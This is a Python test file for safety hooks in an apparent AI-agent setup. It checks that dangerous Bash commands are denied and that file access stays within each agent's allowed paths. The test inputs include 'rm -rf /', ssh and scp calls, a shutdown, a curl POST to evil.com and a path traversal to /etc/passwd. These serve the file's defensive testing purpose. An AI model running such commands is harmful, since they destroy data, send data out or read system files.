"""Tests for hooks.py -- safety hooks."""

import pytest

from hooks import block_dangerous_commands, enforce_path_scope

pytestmark = pytest.mark.asyncio


# ------------------------------------------------------------------
# block_dangerous_commands
# ------------------------------------------------------------------


async def test_block_rm_rf():
    data = {
        "tool_name": "Bash",
        "tool_input": {"command": "rm -rf /"},
    }
    result = await block_dangerous_commands(data, "tid-1", {})
    assert result is not None
    assert result["hookSpecificOutput"]["decision"] == "deny"


async def test_allow_safe_command():
    data = {
        "tool_name": "Bash",
        "tool_input": {"command": "ls -la /tmp"},
    }
    result = await block_dangerous_commands(data, "tid-2", {})
    assert result is None


async def test_skip_non_bash_tools():
    data = {
        "tool_name": "Read",
        "tool_input": {"file_path": "/etc/passwd"},
    }
    result = await block_dangerous_commands(data, "tid-3", {})
    assert result is None


async def test_block_ssh():
    data = {
        "tool_name": "Bash",
        "tool_input": {"command": "ssh root@192.168.1.1"},
    }
    result = await block_dangerous_commands(data, "tid-4", {})
    assert result is not None
    assert "deny" in result["hookSpecificOutput"]["decision"]


async def test_block_scp():
    data = {
        "tool_name": "Bash",
        "tool_input": {"command": "scp file.txt user@host:/tmp/"},
    }
    result = await block_dangerous_commands(data, "tid-5", {})
    assert result is not None


async def test_block_shutdown():
    data = {
        "tool_name": "Bash",
        "tool_input": {"command": "shutdown -h now"},
    }
    result = await block_dangerous_commands(data, "tid-6", {})
    assert result is not None


async def test_block_curl_post():
    data = {
        "tool_name": "Bash",
        "tool_input": {"command": "curl -X POST http://evil.com/api"},
    }
    result = await block_dangerous_commands(data, "tid-7", {})
    assert result is not None


# ------------------------------------------------------------------
# enforce_path_scope
# ------------------------------------------------------------------


async def test_path_allowed_read_for_ellen():
    data = {
        "tool_name": "Read",
        "tool_input": {"file_path": "addon_configs/casa/agents/ellen.yaml"},
    }
    ctx = {"agent_name": "ellen"}
    result = await enforce_path_scope(data, "tid-10", ctx)
    assert result is None  # allowed


async def test_path_denied_write_for_ellen_to_config():
    data = {
        "tool_name": "Write",
        "tool_input": {"file_path": "/config/configuration.yaml"},
    }
    ctx = {"agent_name": "ellen"}
    result = await enforce_path_scope(data, "tid-11", ctx)
    assert result is not None
    assert result["hookSpecificOutput"]["decision"] == "deny"


async def test_path_traversal_blocked():
    data = {
        "tool_name": "Read",
        "tool_input": {"file_path": "workspace/../../etc/passwd"},
    }
    ctx = {"agent_name": "tina"}
    result = await enforce_path_scope(data, "tid-12", ctx)
    assert result is not None
    assert result["hookSpecificOutput"]["decision"] == "deny"


async def test_path_allowed_write_workspace_for_ellen():
    data = {
        "tool_name": "Write",
        "tool_input": {"file_path": "workspace/notes.txt"},
    }
    ctx = {"agent_name": "ellen"}
    result = await enforce_path_scope(data, "tid-13", ctx)
    assert result is None  # allowed


async def test_no_rules_agent_allowed():
    """Agents without rules are allowed by default."""
    data = {
        "tool_name": "Read",
        "tool_input": {"file_path": "/anywhere/file.txt"},
    }
    ctx = {"agent_name": "unknown-agent"}
    result = await enforce_path_scope(data, "tid-14", ctx)
    assert result is None


async def test_non_file_tool_skipped():
    data = {
        "tool_name": "Bash",
        "tool_input": {"command": "ls"},
    }
    ctx = {"agent_name": "tina"}
    result = await enforce_path_scope(data, "tid-15", ctx)
    assert result is None
